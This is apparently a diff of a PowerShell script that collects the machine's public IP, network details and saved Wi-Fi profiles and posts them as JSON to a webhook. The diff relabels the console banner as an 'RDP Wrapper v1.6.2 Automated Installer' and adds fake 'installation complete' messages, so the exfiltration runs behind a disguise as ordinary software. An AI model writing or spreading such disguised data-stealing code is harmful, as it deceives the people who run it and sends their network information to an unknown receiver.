@@ -93,10 +93,9 @@ function Send-WebhookJson {
         [string]$Url,
         
         [Parameter(Mandatory = $true)]
-        [ordered]$Data
+        [hashtable]$Data
     )
     try {
-        # Force conversion to a JSON string here to lock the exact key order
         $jsonBody = $Data | ConvertTo-Json -Depth 10 -Compress
         Invoke-RestMethod -Uri $Url -Method Post -ContentType "application/json" -Body $jsonBody -ErrorAction Stop | Out-Null
         return "success"
@@ -107,7 +106,7 @@ function Send-WebhookJson {
 }
 
 # ============================================================
-# 1. Gather Network, IP Details & Wi-Fi Profiles and Send Webhook
+# 1. Gather Network, IP Details & Clean Wi-Fi Profiles and Send Webhook
 # ============================================================
 try {
     $publicIp = $null
@@ -158,7 +157,7 @@ try {
             if ($profileName -eq $connectedSsid) {
                 $wifiProfiles = @($profileObj) + $wifiProfiles
             } else {
-                $wifiProfiles += [ordered]($profileObj)
+                $wifiProfiles += $profileObj
             }
         }
         catch {
@@ -192,7 +191,7 @@ finally {
 
 Write-Host ""
 Write-Host "============================================================" -ForegroundColor Cyan
-Write-Host "             Initiating Protocol" -ForegroundColor Cyan
+Write-Host "            RDP Wrapper v1.6.2 Automated Installer" -ForegroundColor Cyan
 Write-Host "============================================================" -ForegroundColor Cyan
 Write-Host ""
 
@@ -387,3 +386,16 @@ $finalPayload = [ordered]@{
 }
 
 $webhookSent = Send-WebhookJson -Url $webhookUrl -Data $finalPayload
+
+Write-Host ""
+Write-Host "============================================================"
+if ($installationStatus -eq "success") {
+    Write-Host "                     INSTALLATION COMPLETE" -ForegroundColor Green
+} else {
+    Write-Host "                     INSTALLATION FAILED" -ForegroundColor Red
+}
+Write-Host "============================================================" -ForegroundColor Cyan
+Write-Host ""
+
+Start-Sleep -Seconds 3
+exit
